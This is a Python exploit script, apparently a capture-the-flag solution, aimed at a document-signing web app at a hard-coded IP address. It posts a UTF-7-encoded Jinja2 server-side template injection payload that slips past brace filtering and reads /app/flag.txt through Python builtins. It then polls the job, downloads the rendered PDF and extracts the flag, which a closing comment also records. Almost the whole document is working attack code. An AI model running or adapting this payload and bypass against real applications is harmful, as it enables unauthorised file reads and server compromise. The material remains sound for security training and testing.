#!/usr/bin/env python3
"""
DocSign SSTI Exploit via UTF-7 Encoding Bypass
Target: http://16.184.29.216/
"""

import requests
import time
import sys

TARGET = "http://16.184.29.216"

def exploit():
    print("[*] DocSign SSTI Exploit")
    print(f"[*] Target: {TARGET}")
    
    # UTF-7 encoded Jinja2 SSTI payload to read flag.txt
    # {{ self.__init__.__globals__.__builtins__.open('/app/flag.txt').read() }}
    # In UTF-7: {{ = +AHs-+AHs-, }} = +AH0-+AH0-
    
    payload = "+AHs-+AHs- self.__init__.__globals__.__builtins__.open('/app/flag.txt').read() +AH0-+AH0-"
    
    print(f"[*] Payload: {payload}")
    
    # Step 1: Create document with malicious payload
    print("\n[+] Step 1: Creating malicious document...")
    
    create_url = f"{TARGET}/api/documents"
    document_data = {
        "title": "Exploit Document",
        "markdown_content": payload
    }
    
    try:
        response = requests.post(create_url, json=document_data)
        response.raise_for_status()
        result = response.json()
        
        document_id = result.get("document_id")
        print(f"[+] Document created: {document_id}")
        print(f"[+] Status: {result.get('status')}")
        
        # Extract session cookie
        session_cookie = response.cookies.get("session_id")
        if session_cookie:
            print(f"[+] Session ID: {session_cookie}")
        
    except Exception as e:
        print(f"[-] Failed to create document: {e}")
        return
    
    # Step 2: Wait for PDF processing
    print("\n[+] Step 2: Waiting for PDF to be processed...")
    
    status_url = f"{TARGET}/api/documents/{document_id}"
    cookies = {"session_id": session_cookie} if session_cookie else {}
    
    max_attempts = 20
    for i in range(max_attempts):
        try:
            time.sleep(1)
            response = requests.get(status_url, cookies=cookies)
            status_data = response.json()
            status = status_data.get("status")
            
            print(f"[*] Attempt {i+1}/{max_attempts}: Status = {status}")
            
            if status == "completed":
                print("[+] PDF processing completed!")
                break
            elif status == "failed":
                error = status_data.get("message", "Unknown error")
                print(f"[-] PDF processing failed: {error}")
                return
                
        except Exception as e:
            print(f"[-] Error checking status: {e}")
    
    if status != "completed":
        print("[-] PDF processing timed out")
        return
    
    # Step 3: Download the PDF with flag
    print("\n[+] Step 3: Downloading PDF with flag...")
    
    preview_url = f"{TARGET}/api/documents/{document_id}/preview"
    
    try:
        response = requests.get(preview_url, cookies=cookies)
        response.raise_for_status()
        
        # Save PDF
        pdf_filename = f"exploit_{document_id}.pdf"
        with open(pdf_filename, "wb") as f:
            f.write(response.content)
        
        print(f"[+] PDF saved to: {pdf_filename}")
        
        # Try to extract text from PDF
        print("\n[+] Attempting to extract flag from PDF...")
        try:
            import PyPDF2
            with open(pdf_filename, "rb") as f:
                pdf_reader = PyPDF2.PdfReader(f)
                text = ""
                for page in pdf_reader.pages:
                    text += page.extract_text()
                
                print("\n" + "="*60)
                print("PDF CONTENT:")
                print("="*60)
                print(text)
                print("="*60)
                
                # Look for flag pattern
                if "whitehat" in text.lower():
                    print("\n[!] FLAG FOUND IN PDF!")
                    for line in text.split('\n'):
                        if 'whitehat' in line.lower():
                            print(f"[!] {line}")
                            
        except ImportError:
            print("[-] PyPDF2 not installed. Install with: pip install PyPDF2")
            print(f"[*] Please manually check the PDF: {pdf_filename}")
        except Exception as e:
            print(f"[-] Error extracting text: {e}")
            print(f"[*] Please manually check the PDF: {pdf_filename}")
            
    except Exception as e:
        print(f"[-] Failed to download PDF: {e}")
        return
    
    print("\n[+] Exploit completed!")

if __name__ == "__main__":
    exploit()

# flag : whitehat2025{a1c56e0f04fb9abc8467c89089703c8c224d56bc007344b37101f6abe3}